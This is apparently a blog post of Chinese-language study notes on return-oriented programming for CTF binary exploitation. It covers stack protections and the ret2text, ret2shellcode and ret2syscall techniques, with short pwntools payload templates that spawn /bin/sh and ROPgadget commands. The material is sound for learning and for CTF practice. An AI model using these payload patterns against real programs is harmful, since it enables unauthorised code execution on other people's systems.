---
title: "pwn rop入门-学习笔记"
slug: "pwn-rop-study-notes"
description: "在学了在学了"
date: 2022-01-18T00:00:14+08:00
categories: ["pwn"]
series: ["PWN-从入门到入坟"]
tags: ["pwn"]
draft: false
toc: true
---

# ROP

return oriented programming

## 简单的汇编指令

- ret -> pop EIP (ESP增大)

- leave -> move ESP, EBP; pop EBP

- | intel            | AT&T                |
  | ---------------- | ------------------- |
  | mov  eax, 8      | movl  $8, %eax      |
  | mov  ebx, 0ffffh | movl  $0xffff, %ebx |
  | int  80h         | int  $80            |
  | mov  eax, [ecx]  | movl  (%ecx), %eax  |

## 几种防护措施

- canary: 随机值防止栈溢出 (cookie)
- ASLR: 全局系统变量`/proc/sys/kernel/randomize_va_space`，内存地址随机化，而gdb调试中为关闭状态
- PIE: 内存地址随机化
- NX: 数据不可执行

## ret2text

在代码段.text存在后门函数，将ret address修改为后门函数的地址控制函数的执行

```python
payload = cyclic(n) + p32(sys_addr)
# n: ebp-eax+4(or 8), p32 or p64
```

## ret2shellcode

存在rwx代码片段，传入shellcode并修改ret address为shellcode所在的缓冲区地址

NX不开启时直接写入栈缓冲区，开启时向bss缓冲区或堆缓冲区写入shellcode并使用mprotect赋予可执行权限

- [shellcode](http://shell-storm.org/shellcode/)

- ```python
  from pwn import *
  shellcraft.sh()
  shellcraft.amd64.sh()	# before: context.arch = 'amd64'!
  payload = asm(shellcraft.sh())
  ```

```python
shellcode = b''
payload = shellcode.ljust(n, b'A') + p32(sh_addr)
```

## ret2syscall

存在`/bin/sh`或`sh`字符串，构造gadgets多次跳转ret addr来执行`execve`系统调用；gadgets通过`ROPgadget`寻找

```shell
ROPgadget --binary filename_here --only 'pop|ret' | grep 'ebx'
ROPgadget --binary filename_here --string '/bin/sh'
ROPgadget --binary rop  --only 'int'
```

整体的payload构造与函数调用栈的工作原理和系统调用的实现有关，x86下通过`int 0x80`执行，amd64下为`syscall`；注意参数传入的顺序 (1->N) 与栈中存放的顺序 (N->1)的区别

```python
payload = flat(cyclic(n), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh_addr, int80_addr)
# 0xb: execve的系统调用号 11, execve("/bin/sh", NULL, NULL)
```

_Refer: [System call](https://en.wikipedia.org/wiki/System_call)



{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

- [XMCVE 2020 CTF Pwn入门课程](https://www.bilibili.com/video/BV1854y1y7Ro)
- [ctfwiki - Stack Overflow](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/)
- [蒸米ROP](https://www.yuque.com/hxfqg9/bin/zzg02e)
- [365-days-get-xuanwulab-job/weeks/week1.md](https://github.com/Vancir/365-days-get-xuanwulab-job/blob/master/weeks/week1.md)

- [C 语言函数调用栈 (一)](http://www.cnblogs.com/clover-toeic/p/3755401.html)
- [C 语言函数调用栈 (二)](http://www.cnblogs.com/clover-toeic/p/3756668.html)
- [C 语言函数调用栈 (二)](https://www.cnblogs.com/clover-toeic/p/3757091.html)

- [System call](https://en.wikipedia.org/wiki/System_call)

{{% /spoiler %}}
